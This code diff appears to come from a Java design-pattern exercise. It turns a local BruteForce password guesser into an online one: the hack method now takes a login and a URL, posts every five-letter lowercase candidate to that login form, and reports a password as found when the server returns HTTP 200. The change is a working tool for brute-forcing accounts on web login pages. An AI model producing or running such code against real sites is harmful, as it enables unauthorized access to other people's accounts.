@@ -1,6 +1,7 @@
 package FactoryMethod.PasswordCracker;
 
 import javax.swing.*;
+import java.io.IOException;
 import java.util.Arrays;
 
 public class BruteForce implements Cracker{
@@ -44,7 +45,8 @@ public class BruteForce implements Cracker{
 
 
     @Override
-    public void hack(String mdp ) {
+    public void hack(String login, String url) throws IOException, InterruptedException {
+        HttpClientPostForm http = new HttpClientPostForm();
         char[] charset = "abcdefghijklmnopqrstuvwxyz".toCharArray();
         String tentative = new String();
 
@@ -56,8 +58,9 @@ public class BruteForce implements Cracker{
                             tentative = "" + charset[i] + charset[j] + charset[j2] + charset[k] + charset[k2];
 
                             System.out.println(tentative);
-                            if (tentative.equals(mdp)) {
-                                System.out.println();
+                            System.out.println(http.getPassword(url, login, tentative));
+                            if (http.getPassword(url, login, tentative)==200) {
+                                System.out.println(http.getPassword(url, login, tentative));
                                 JOptionPane.showMessageDialog(null, "mot de passe trouvé : " + tentative);
                                 break outerloop;
                             } else {
